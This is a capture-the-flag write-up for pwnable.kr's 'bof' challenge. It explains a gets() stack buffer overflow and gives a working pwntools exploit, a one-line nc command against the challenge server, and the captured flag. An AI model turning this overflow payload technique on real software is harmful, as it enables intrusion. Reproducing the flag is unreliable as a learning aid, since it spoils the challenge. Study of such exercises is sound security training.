## Description

> Nana told me that buffer overflow is one of the most common software vulnerability.
> Is that true?

This challenge demonstrates a classic **stack buffer overflow** caused by the unsafe use of `gets()`.

---

## Initial Triage

```bash id="t1"
ls -la
```

```text id="t2"
-rwxr-xr-x   1 root bof  15300 Mar 26  2025 bof
-rw-r--r--   1 root root   342 Mar 26  2025 bof.c
```

---

## Source Code Analysis

```c id="t3"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);   // unsafe input

    if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
    } else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

---

## Key Findings

* `overflowme[32]` is a fixed-size stack buffer
* `gets()` performs no bounds checking
* overflow can overwrite adjacent stack data
* `key` is passed as a function argument
* success condition requires `key == 0xcafebabe`
* initial value is `0xdeadbeef`, so it must be overwritten

This is a **classic stack buffer overflow vulnerability**.

---

## Stack Analysis

From disassembly:

```asm id="t4"
lea -0x2c(%ebp), %eax
call gets
```

The buffer is located at `ebp - 0x2c` (44 bytes).

---

### Stack Layout (simplified)

* overflowme buffer: 32 bytes
* saved ebp: 4 bytes
* return address: 4 bytes
* function argument key: located above stack frame

---

## Key Insight

To reach and overwrite `key`:

* 32 bytes buffer
* 4 bytes padding to saved ebp
* 4 bytes padding to return address
* remaining overwrite reaches `key`

Total padding to `key` is **52 bytes**

---

## Exploit Strategy

Overwrite `key` with:

```
0xcafebabe
```

Little-endian form:

```
\xbe\xba\xfe\xca
```

---

## Exploit

```python id="t5"
from pwn import *

payload = b"A" * 52 + b"\xbe\xba\xfe\xca"

p = process("./bof")
p.sendline(payload)
p.interactive()
```

Or remote:

```bash id="t6"
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca\n')"; cat) | nc pwnable.kr 9000
```

---

## Result

```text id="t7"
Daddy_I_just_pwned_a_buff3r!
```

---

## Takeaway

This challenge shows that:

* `gets()` is unsafe and deprecated
* stack buffers have predictable layout
* overwriting function arguments can control program logic
* no ROP or shellcode is required for basic exploitation
* precise padding is enough to exploit stack overflows
